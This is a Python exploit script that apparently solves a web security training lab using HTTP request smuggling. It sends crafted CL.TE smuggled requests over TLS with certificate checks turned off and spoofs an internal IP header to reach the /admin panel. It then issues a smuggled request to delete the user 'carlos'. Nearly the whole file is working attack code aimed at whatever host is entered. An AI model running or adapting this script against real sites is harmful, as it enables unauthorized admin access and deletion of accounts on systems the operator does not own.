import ssl
import time
import socket

host=input("Enter host name without http or https schema\n")

print("="*60)
print("Exploiting HTTP request smuggling to reveal front-end request rewriting")
print("="*60)

#First request smuggling to test if /admin accessible or not
"""used one of the accessble end point that is
POST / HTTP/1.1 in smuggling to reveal the host header i,e X-HXWnhB-Ip: 127.0.0.1"""

"""
The request is as below
POST / HTTP/1.1
Host: {host}
Content-Length: 146
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST / HTTP/1.1
X-HXWnhB-Ip: 127.0.0.1
Content-Length: 150 (use it as required to display headers)
Content-Type: application/x-www-form-urlencoded

search=GET /admin HTTP/1.1
"""

req1=f"""POST / HTTP/1.1
Host: {host}
Content-Length: 146
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-HXWnhB-Ip: 127.0.0.1
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

search=GET /admin HTTP/1.1
"""
req1=req1.replace("\n","\r\n")

print("\n" + "="*60)
print("REQUEST 1: SMUGGLING")
print("="*60)
print(req1)

sock1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx1=ssl.create_default_context()
ctx1.check_hostname=False
ctx1.verify_mode=ssl.CERT_NONE
ssl1=ctx1.wrap_socket(sock1,server_hostname=host)
ssl1.connect((host, 443))
ssl1.send(req1.encode())
resp1=ssl1.recv(4096).decode()
ssl1.close()

print("\n"+"="*60)
print("RESPONSE 1: Should be 200 Ok")
print("="*60)
print(resp1[:300])

time.sleep(0.5)

"""Second request: it is a normal request which is made by other user. it will be appended after search value in req1 """
req2=f"""POST / HTTP/1.1
Host: {host}
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

search=asdfghj
"""
req2=req2.replace("\n", "\r\n")

print("\n" + "="*60)
print("REQUEST 2:")
print("="*0)
print(req2)

sock2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ctx2=ssl.create_default_context()
ctx2.check_hostname=False
ctx2.verify_mode=ssl.CERT_NONE
ssl2=ctx2.wrap_socket(sock2, server_hostname=host)
ssl2.connect((host,443))
ssl2.send(req2.encode())
resp2=ssl2.recv(4096).decode()
ssl2.close()

print("\n" + "="*60)
print("RESPONSE 2:")
print("="*60)
print(resp2)

print("\n" + "="*60)
if "/admin/delete?username=carlos" in resp2:
    print("✅Successfully accessed Amdin pannel")
    req3=f"""POST / HTTP/1.1
Host: {host}
Content-Length: 192
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-HXWnhB-Ip: 127.0.0.1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

search=GET /admin/delete?username=carlos HTTP/1.1
"""
    req3 = req3.replace('\n', '\r\n')
    print("\n" + "="*60)
    print("REQUEST 3: Deleting Carlos user to solve the lab")
    print("="*60)
    print(req3)
    sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ctx3 = ssl.create_default_context()
    ctx3.check_hostname = False; ctx3.verify_mode = ssl.CERT_NONE
    ssl3 = ctx3.wrap_socket(sock3, server_hostname=host)
    ssl3.connect((host, 443)); ssl3.send(req3.encode())
    resp3 = ssl3.recv(8096).decode()
    ssl3.close()
    print("\n" + "="*60)
    print("RESPONSE 3: should be 200 ok")
    print("="*60)
    print(resp3)
    
    time.sleep(0.5)
    req4=f"""POST / HTTP/1.1
Host: {host}
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

search=asdfghj
"""
    req4=req4.replace("\n", "\r\n")

    print("\n" + "="*60)
    print("REQUEST 4:")
    print("="*0)
    print(req4)

    sock4=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ctx4=ssl.create_default_context()
    ctx4.check_hostname=False
    ctx4.verify_mode=ssl.CERT_NONE
    ssl4=ctx4.wrap_socket(sock4, server_hostname=host)
    ssl4.connect((host,443))
    ssl4.send(req4.encode())
    resp4=ssl4.recv(4096).decode()
    ssl4.close()

    print("\n" + "="*60)
    print("RESPONSE 4:")
    print("="*60)
    print(resp4)

    print("\n" + "="*60)
    print("\n" + "="*60)
    if "302 Found" in resp4:
        print("✅ SUCCESS! Lab SOLVED!")
        print("   Check your browser - lab should show 'Congratulations'")
    else:
        print("❌ No '302 Found' detected in resp4")
    print("="*60)    
else:
    print("❌ Not able to access admin pannel")
print("="*60)
